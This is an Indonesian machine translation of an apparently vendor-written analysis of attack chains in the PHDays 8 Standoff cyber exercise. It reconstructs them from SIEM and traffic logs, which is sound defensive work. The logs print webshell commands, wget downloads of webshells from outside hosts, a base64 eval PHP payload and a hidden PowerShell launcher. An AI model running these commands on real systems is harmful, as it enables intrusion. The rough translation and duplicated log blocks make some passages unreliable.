<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üç§ üë©üèæ‚Äçü§ù‚Äçüë©üèª üïï Konfrontasi di Positive Hack Days 8: parsing rantai serangan üëå üßóüèº ü¶ã</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Jadi, "konfrontasi" berikutnya berakhir pada Positive Hack Days 8. Kali ini, lebih dari seratus orang ambil bagian dalam pertarungan: 12 tim penyerang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Konfrontasi di Positive Hack Days 8: parsing rantai serangan</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Jadi, "konfrontasi" berikutnya berakhir pada Positive Hack Days 8. Kali ini, lebih dari seratus orang ambil bagian dalam pertarungan: 12 tim penyerang, 8 tim pembela dan seluruh kota yang harus mereka serang dan pertahankan. <a name="habracut"></a><br><br>  Kali ini, The Standoff dihadiri tidak hanya oleh tim penyerang dan pembela, tiga produk perusahaan kami menyaksikan semua yang terjadi di jaringan game: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">MaxPatrol SIEM</a></b> - sistem SIEM. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PT Network Attack Discovery</a></b> adalah solusi keamanan jaringan untuk menganalisis lalu lintas jaringan, mengidentifikasi dan menyelidiki insiden. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PT MultiScanner</a></b> adalah sistem multi-level untuk mendeteksi dan memblokir konten berbahaya. </li></ul><br>  Ketiga produk tersebut dipantau oleh tim pusat pakar teknologi Positive Technologies (PT ESC), yang memantau tren dan acara permainan untuk memberi tahu pengunjung pusat ahli tentang hal ini. <br><br>  Ini adalah partisipasi pertama dari tim ahli dan produk dan mereka menunjukkan sisi terbaik mereka: ada begitu banyak data yang cukup untuk laporan besar.  Jaringan kantor # 2 dari perusahaan integrator SPUTNIK dan kantor # 1 dari perusahaan asuransi BeHealthy ternyata menjadi yang paling menarik dan lengkap dengan deskripsi.  Kantor No. 2 menarik karena berada di bawah pengawasan SOC RTK, tetapi tidak diurus oleh tim pembela dan sepenuhnya diretas oleh tim penyerang. <br><br>  Izinkan saya mengingatkan Anda bahwa selain dua kantor, kota ini memiliki stasiun dan stasiun pembangkit tenaga termal, kereta api, rumah pintar dengan pemulihan energi dan bank dengan ATM. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Infrastruktur permainan</i> <br><br>  Bagaimana peristiwa di kantor # 1 dan # 2 dilihat melalui prisma MaxPatrol SIEM, PT NAD dan PT MultiScanner dengan penekanan pada perincian teknis peretasan akan dibahas nanti. <br><br>  Diagram logika kantor jaringan permainan # 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  Alamat tim penyerang adalah 172.31.x.0 / 24, di mana x adalah nomor perintah dari 1 hingga 8. Sebenarnya, ada 12 tim secara total, tetapi karena arsitektur infrastruktur jaringan jaringan (inti jaringan ditiru dalam Cisco CSR1000v) dan fisik peralatan, itu mungkin untuk mengatur hanya 8 antarmuka jaringan fisik yang diaktifkan untuk tim di seluruh area permainan.  Karena itu, dalam empat jaringan, dua tim ditempatkan. <br><br>  Dalam infrastruktur Office # 2, empat segmen jaringan dialokasikan: <br><br><ul><li>  DMZ (100.64.154.0/25); </li><li>  server (10.106.60.0/24); </li><li>  Karyawan perusahaan (10.106.50.0/24); </li><li>  tim bek (10.106.82.0/24). </li></ul><br>  Node yang terletak di zona demiliterisasi dapat diakses melalui jaringan untuk semua penyerang.  Saat mengakses node-node ini, alamat jaringan sebenarnya dari perintah NAT berasal dari pool 100.110.255.0/24, jadi bagi para pembela HAM tidak mudah untuk mengetahui siapa yang memiliki lalu lintas jaringan ini atau itu - bisa jadi salah satu dari 12 tim penyerang atau pemeriksa skrip yang sah, memeriksa kemampuan layanan dari kumpulan alamat yang sama dengan penyerang. <br><br>  Untuk mengisi produk kami dengan peristiwa tentang apa yang terjadi dalam infrastruktur game, kami mengatur penghapusan dan pengalihan salinan semua lalu lintas jaringan di PT NAD, serta mengatur audit yang diperluas atas peristiwa sistem target dan mengatur pengirimannya ke MaxPatrol SIEM. <br><br>  Analisis serangan dengan penekanan pada tim dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">laporan</a> kami yang lain <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tentang Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  Salah satu server di DMZ office # 2 adalah server dengan Joomla CMS.  Beberapa jam setelah dimulainya permainan, tanda-tanda kompromi pertama dari server ini muncul di PT NAD - webshell mengisi dari kumpulan alamat IP "abu-abu": <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Seperti yang disebutkan, semua subnet dari tim penyerang diakhiri pada ME yang sama (Penyerang-FW) dan ketika membuat koneksi ke objek yang diserang, alamat IP penyerang diterjemahkan ke dalam alamat IP abu-abu dari satu kumpulan (100.110.255.0/24).  Oleh karena itu, untuk personifikasi serangan dengan perintah, skema dilaksanakan dengan pengayaan gateway menurut tabel NAT dari ME ini.  Dalam kerangka MP SIEM, pengayaan adalah sebagai berikut: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Pendekatan ini memungkinkan kami untuk menentukan bahwa serangan ini diprakarsai oleh tim # 1.  Namun, karena penggunaan kumpulan alamat yang sama oleh tim yang berbeda, kami tidak dapat secara andal menentukan nama tim berdasarkan permintaan dari jaringan tertentu, dan untuk tujuan narasi lebih lanjut kami akan memberi nama tim dengan nomor jaringan mereka. <br><br>  Satu jam setelah mencoba perintah # 1, PT NAD memperhatikan bahwa perintah # 8 sedang memuat ke shell web lain dengan nama yang berbicara SHE __ Php, apakah itu hasil dari peretasan server atau pemindaian sederhana - tidak mungkin untuk membangun dengan andal, tetapi setelah beberapa menit dari yang ke-8 Perintah ini mengatur sesi ssh dari pengguna yang tidak memiliki hak. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  Kata sandi untuk akun ini ada di bagian atas kamus rockyou dan dicocokkan.  Akses ke akun root untuk tim ke-8 hanya muncul sekitar pukul 4:00 malam karena keanggotaan pengguna dalam grup dengan hak untuk menjalankan perintah yang bebas kata sandi dari root.  Kita dapat diyakinkan tentang ini dalam log MP SIEM, yang memberi tahu kita tentang login pertama sebagai pengguna, dan kemudian eskalasi hak istimewa dengan perintah sudo. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  Waktu log dapat bervariasi 3 jam karena konfigurasi server game. <br><br>  Menjelang malam hari pertama konfrontasi, tim keenam menguasai Joomla.  NAD menemukan eksploitasi kerentanan, atau lebih tepatnya, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">fitur di</a> mana tim mengunggah shell web WSO yang dikenal luas dan mulai berinteraksi dengannya. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Perlu dicatat bahwa skrip yang digunakan perintah untuk mengisi shell, <br>  membutuhkan akun administrator, kata sandi yang dipilih menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">kerentanan</a> lain CVE-2017-14596 dalam mekanisme otentikasi di Joomla melalui LDAP: dengan mengubah permintaan LDAP otentikasi, penyerang dengan cepat mengambil login dan kata sandi dari akun administrator. <br><br>  Dan setelah setengah jam mereka mengendalikan seluruh sistem. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  Tim penyerang menggunakan mesin yang ditangkap untuk pengintaian lebih lanjut dalam jaringan kantor SPUTNIK kedua dengan nmap dan utilitas hping3.  Kami bisa mendapatkan gagasan tentang tindakan mereka dari data MP SIEM: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Contoh jaringan kantor intelijen DMZ 2 (100.64.154.0/24) dan jaringan tim bek (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  Pada 21:17, kami menemukan bahwa klien OpenVPN diinstal dan diluncurkan pada server Joomla.  Koneksi dibuat dengan server 195.16.61.229, yang terletak di Moskow.  Beberapa saat kemudian, kami menemukan bahwa tindakan ini dilakukan oleh anggota tim # 6 dan dengan demikian tim berhasil menarik komputasi tambahan dan sumber daya manusia yang terletak di lokasi terpencil. <br><br>  Semua interaksi dengan situs jarak jauh dilakukan di dalam terowongan yang dilindungi, sehingga tidak mungkin untuk menentukan sifat interaksi ini dan tingkat pengaruhnya terhadap permainan.  Kami hanya dapat membuat kesimpulan tidak langsung, berdasarkan jumlah sesi VPN dan jumlah data yang ditransfer. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Tetapi hal yang paling menarik adalah bahwa tim tidak membersihkan jejak - setelah pertandingan, kami menemukan di server ovpn konfigurasi yang berisi root dan sertifikat pribadi, kunci pribadi dan data pribadi pemilik kunci.  Jika Anda menggunakan mesin pencari, sama sekali tidak sulit untuk menentukan identitas asli pemiliknya dengan nama panggilan phonexicum.  Peta lengkap dengan semua koneksi VPN selama permainan dapat diperiksa di akhir artikel. <br><br>  Acara menarik lainnya mulai berkembang setelah tengah malam (+3 jam untuk log). <br>  Perintah shell /id.php # 4 menemukan perintah # 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  Dan segera memperkuat dalam sistem, melestarikan shell web WSO dengan nama 123.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  Tim pertama di-host hingga tim # 4 menemukan ini beberapa jam kemudian dan, setelah diskusi singkat, mengganti nama shell id.php menjadi 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Selanjutnya, 021371b392f0b42398630fd668adff5d.php digantikan oleh kekekeke.php dan kekpek.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Peristiwa berikut dalam infrastruktur domain kantor # 2 SPUTNIK terkait erat dengan apa yang terjadi di Jumla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Setelah Joomla ditusuk, penyerang memperoleh akses ke segmen internal infrastruktur SPUTNIK (Kantor # 2).  Tanpa berpikir dua kali, exploit MS17-010 terbang ke kontroler domain WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  Lebih mudah untuk mengamati kronologi peristiwa lebih lanjut oleh pemicu MP SIEM: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  Langkah pertama penyerang adalah membuat pengguna dengan nama "nama pengguna" dan kata sandi "1qazzaq!"  dan menambahkannya ke grup administrator lokal (layar # 2).  Eksploitasi eksploit yang berhasil dari MS17-010 memberikan akses dengan hak istimewa NT-Authority \ System dan dalam log Windows akses tersebut ditampilkan sebagai win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  Atas nama pengguna baru, buat beberapa layanan yang menjalankan skrip PowerShell tertentu: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span 